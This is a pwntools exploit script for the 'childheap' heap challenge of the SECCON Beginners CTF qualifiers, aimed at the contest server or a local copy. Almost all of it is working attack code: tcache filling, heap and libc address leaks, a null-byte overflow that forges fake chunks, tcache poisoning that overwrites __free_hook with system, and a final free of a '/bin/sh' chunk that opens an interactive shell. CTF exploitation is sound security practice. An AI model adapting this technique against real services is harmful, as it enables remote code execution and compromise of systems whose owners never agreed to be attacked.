#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./childheap"

rhp1 = {'host':"childheap.quals.beginners.seccon.jp",'port':22476} #for actual server
rhp2 = {'host':"localhost",'port':12500} #for localhost 
rhp3 = {'host':"localhost",'port':23947} #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF("./libc-2.29.so")

ogs = [0xe237f,0xe2383,0xe2386,0x106ef8]

def hoge(conn,ix):
  conn.recvuntil("> ")
  conn.sendline(str(ix))

def alloc(conn,size,content):
  hoge(conn,1)
  conn.recvuntil("Size: ")
  conn.sendline(str(size))
  conn.recvuntil("Content: ")
  conn.send(content)

def delete(conn,yesno=True):
  hoge(conn,2)
  conn.recvuntil("Content: '")
  data = conn.recvuntil("'")[:-1]
  conn.recvuntil("] ")
  if yesno:
    conn.sendline("y")
  else:
    conn.sendline("n")
  return data

def wipe(conn):
  hoge(conn,3)

def de(conn):
  delete(conn)
  wipe(conn)

def ade(conn,size,overflow=False):
  a = "A"*size if overflow else "A"*(size-0x8)
  alloc(conn,size,a)
  de(conn)

def aw(conn,size,overflow=False): # without delete
  a = "A"*size if overflow else "A"*(size-0x8)
  alloc(conn,size,a)
  wipe(conn)

off_libc = 0x1e4e90
off_freehook = 0x1e75a8
off_system = 0x52fd0

def exploit(conn):
  ssize = 0x18#0x28
  msize = 0xf8
  lsize = 0x108#0x128

  ## fulfill tcache
  ade(conn,msize)
  for i in range(0x5):
    ade(conn,ssize)
    ade(conn,lsize)
    aw(conn,ssize,True)
    ade(conn,lsize)
      # now tcache has 6 chunks, 5 of them have fake size

  ## leak heap addr
  alloc(conn,msize,"A"*8)
  delete(conn)
  heapbase = unpack(delete(conn,False).ljust(8,'\x00'))-0x710
  print("heapbase: "+hex(heapbase))
  wipe(conn)


  ## forge fake chunk
  fake1 = "B" * 0x30
  fake1 += p64(heapbase + 0x9b0) + p64(heapbase + 0x9b0)
  fake2 = p64(0) + p64(0x100)
  fake2 += p64(heapbase + 0x990) + p64(heapbase + 0x990)
  ade(conn,ssize)
  ade(conn,lsize)
  aw(conn,ssize,True)
  alloc(conn,lsize,fake1+fake2) 
  de(conn)
  print("Fig.1")
                  # tcache[0x100] is full

  ade(conn,ssize+0x20)
  ade(conn,lsize)
  alloc(conn,ssize+0x10,(p64(0)+p64(ssize+0x8+1))*2)
  wipe(conn)
  alloc(conn,ssize+0x20,"C"*(ssize-0x8+0x20)+p64(0x100)) # null overflow
  de(conn)
  print("Fig.2")

  alloc(conn,lsize,(p64(0)+p64(0x21))*0x10)
  print("Fig.3")
  de(conn) # consolidate
  print("Fig.4")

  ## leak libcbase
  alloc(conn,0,"")
  libcbase = unpack(delete(conn,False).ljust(8,'\x00')) - off_libc
  print("libcbase: "+hex(libcbase)) 
  de(conn)

  ## 
  print("free_hook: "+hex(libcbase+off_freehook))
  inj = "D"*0xa0
  inj += p64(libcbase + off_freehook)
  inj += p64(heapbase + 0x10)
  alloc(conn,0x128,inj) # overwrite tcache[ssize+0x20]'s fd
  wipe(conn)
  alloc(conn,ssize+0x20,"G"*8) #
  wipe(conn)
  alloc(conn,ssize+0x20,p64(libcbase + off_system)) # overwrite free_hook
  wipe(conn)

  alloc(conn,0x70,"/bin/sh\x00")
  delete(conn,True)



if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
  elif sys.argv[1][0]=="v":
    conn = remote(rhp3["host"],rhp3["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

